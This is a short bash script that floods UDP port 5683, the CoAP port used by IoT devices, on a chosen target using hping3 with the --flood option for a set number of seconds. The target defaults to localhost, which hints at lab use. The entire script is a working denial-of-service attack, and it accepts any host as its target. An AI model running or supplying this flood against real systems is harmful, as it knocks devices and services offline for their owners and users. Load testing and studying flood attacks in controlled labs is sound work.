#!/usr/bin/env bash
set -e
TARGET="${1:-127.0.0.1}"
DURATION="${2:-20}"
echo "=== CoAP UDP Flood / hping3 ==="
echo "Target: $TARGET Port: 5683 Duration: ${DURATION}s"
sudo timeout "$DURATION" hping3 --udp --flood -p 5683 "$TARGET"
